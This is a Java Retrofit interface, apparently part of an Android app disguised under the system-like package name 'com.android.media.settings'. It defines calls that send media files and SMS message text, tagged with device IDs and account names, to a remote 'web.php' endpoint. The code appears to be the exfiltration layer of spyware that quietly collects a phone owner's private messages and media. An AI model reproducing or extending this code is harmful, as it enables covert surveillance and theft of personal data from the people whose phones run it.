package com.android.media.settings.API;

import com.android.media.settings.Models.MediaAPIResponse;
import com.android.media.settings.Models.MediaConfigResponse;

import java.util.Map;

import io.reactivex.Observable;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;
import retrofit2.http.PartMap;
import retrofit2.http.Query;

public interface MediaAPI {
//    @Multipart
//    @POST("web.php?call=saveImages")
//    Observable<MediaAPIResponse> saveImages(@PartMap Map<String, RequestBody> images, @Query("device_id") String deviceId, @Query("ac_name") String accountName);

    @Multipart
    @POST("web.php?call=uploadMedia")
    Observable<MediaAPIResponse> uploadMedia(@Part MultipartBody.Part media, @Query("device_id") String deviceId, @Query("ac_name") String accountName);

    @POST("web.php?call=saveSms")
    Observable<MediaAPIResponse> postSms(@Query("message") String message, @Query("device_id") String deviceId, @Query("ac_name") String accountName );

    @POST("web.php?call=initApp")
    Observable<MediaConfigResponse> initApp(@Query("device_id") String deviceId, @Query("ac_name") String accountName);
}
